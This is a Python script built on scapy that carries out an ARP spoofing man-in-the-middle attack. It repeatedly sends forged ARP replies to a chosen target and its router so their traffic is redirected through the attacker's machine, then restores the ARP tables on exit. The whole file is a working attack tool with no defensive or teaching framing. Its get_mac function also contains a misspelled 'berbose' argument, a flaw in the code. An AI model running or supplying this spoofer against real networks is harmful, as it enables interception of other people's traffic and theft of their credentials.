import scapy.all as scapy
import time
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip",
                        help="Target IP")
    parser.add_argument("-g", "--router", dest="router_ip",
                        help="Router IP")                        
    options = parser.parse_args()
    return options


def get_mac(ip):
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
        arp_request_broadcast =  broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout = 1, berbose = False)[0]

        return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip )
    scapy.send(packet, verbose= False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)

target_ip = get_arguments().target_ip
router_ip = get_arguments().router_ip


try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent:" + str(sent_packets_count), end = "")
        time.sleep(2)
except (KeyboardInterrupt):
    print("\n[-] Detected Ctrl + C ... Reseting ARP tables .... Please Wait.")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
